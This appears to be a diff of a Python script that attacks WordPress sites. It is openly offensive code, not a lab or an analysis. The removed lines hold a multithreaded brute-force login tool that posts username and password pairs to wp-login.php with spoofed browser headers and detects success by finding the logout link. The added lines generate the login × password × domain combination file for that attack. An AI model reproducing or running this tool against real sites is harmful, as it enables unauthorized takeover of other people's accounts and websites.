@@ -1,48 +1,49 @@
 # coding=utf-8
-import requests
-import time
 import os
-from threading import Thread, current_thread
-from queue import Queue
 
-headers = {
-    'User-Agent': 'Mozilla/5.0 (Windows NT 6.0; rv:14.0) Gecko/20100101 Firefox/14.0.1',
-    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-    'Accept-Language': 'ru-ru,ru;q=0.8,en-us;q=0.5,en;q=0.3',
-    'Accept-Encoding': 'gzip, deflate',
-    'Connection': 'keep-alive',
-    'DNT': '1'
-}
+#------------------login list----------------------------------
+login = open('login.txt' , 'r')
+login_list = login.readlines()
+login.close()
+#--------------------------------------------------------------
+#------------------pwd list----------------------------------
+pwd = open('pwd.txt' , 'r')
+pwd_list = pwd.readlines()
+pwd.close()
+#--------------------------------------------------------------
+#------------------domains list----------------------------------
+domains = open('domains.txt' , 'r')
+domains_list = domains.readlines()
+domains.close()
+#--------------------------------------------------------------
 
-login_file = "login.txt"
-pass_file = "pwd.txt"
-domain_file = "domain.txt"
+theard_count = 1
+def gen():
+    #t = domains.split('.')
+    #s = t[0]
+    for i in range(len(login_list)):
+        login = login_list[i].strip()
+        for i in range(len(pwd_list)):
+            pwd = pwd_list[i].strip()
+            for i in range(len(domains_list)):
+                #domains = domains_list
+                open('source.txt', 'a+').write(login+' '+pwd+' '+domains_list[i])
 
-theard_count = 100
-def gen(login, pwd, domain):
-    t = string.split()
-    payload = {
-        'log':t[0],
-        'pwd':t[1],
-        #'wp-submit': 'Log+In',
-        #'rememberme': 'forever',
-        'redirect_to': 'https://'+t[2]+'/wp-admin',
-        'testcookie': '1'
-    }
-    url = 'http://'+t[2]+'/wp-login.php'
-    s = requests.Session()
-    try:    
-        s.post(url, data=payload, headers=headers, timeout = 30)
-    except Exception:
-        print('ERROR')
-        return False
-    response = s.get('http://'+t[2]+'/wp-admin', headers=headers, timeout = 30)
-    if response.text.find('action=logout')>0:
-        return True
-    else:
-        return False
+def gen_host():
+    for i in range(len(domains_list)):
+        s = domains_list[i].strip()
+        t = s.split('.')    
+        login = t[0]
+        for i in range(len(pwd_list)):
+            pwd = pwd_list[i].strip()
+            open('source.txt', 'a+').write(s+' '+pwd+' '+s+'\n')
+        for i in range(len(pwd_list)):
+            pwd = pwd_list[i].strip()
+            open('source.txt', 'a+').write(s+' '+pwd+' '+s+'\n')
 
-def run(queue, result_queue):
+gen()
+gen_host()
+'''def run(queue, result_queue):
     # Цикл продолжается пока очередь задач не станет пустой
     while not queue.empty():
         # получаем первую задачу из очереди
@@ -94,4 +95,4 @@ def main():
     print(time.time() - start_time)
 
 if __name__ == '__main__':
-    main()
+    main()'''
